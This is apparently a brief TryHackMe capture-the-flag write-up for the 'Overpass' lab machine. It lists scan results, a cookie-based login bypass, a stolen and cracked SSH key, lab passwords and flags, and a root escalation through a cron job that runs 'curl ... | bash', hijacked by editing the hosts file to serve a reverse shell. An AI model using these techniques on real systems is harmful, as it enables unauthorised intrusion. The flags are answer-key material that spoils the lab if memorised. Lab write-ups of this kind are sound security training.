# Tryhackme.com Room : Overpass
`https://tryhackme.com/room/overpass`


# Instance
```
export IP=10.10.17.82
```

# Nmap
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                      
| ssh-hostkey:                                                                                                         
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)                                                         
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
MAC Address: 02:23:25:69:ED:2B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



Potentials users :
```
Ninja - Lead Developer
Pars - Shibe Enthusiast and Emotional Support Animal Manager
Szymex - Head Of Security
Bee - Chief Drinking Water Coordinator
MuirlandOracle - Cryptography Consultant
```


Comments in html
```
<!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
```

Ceasar cipher ? rot47

Gobuster scan
```
/img (Status: 301)
/downloads (Status: 301)
/aboutus (Status: 301)
/admin (Status: 301)
/css (Status: 301)
```

Login page do post on `/api/login`

Change cookie value to authenticate 

We find an ssh key on admin page

belong to user `james`

Cracked password :
```
james13
```

User flag
```
thm{65c1aaf000506e56996822c6281e6bf7}
```

There is an `~/.overpass`

We launch overpass and get 
```
System   saydrawnlyingpicture
```

This is james password

There is a cron :
```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

We change the host file for overpass.thm to point to us

We host a file with a reverse shell and get root access

Root flag
```
thm{7f336f8c359dbac18d54fdd64ea753bb}
```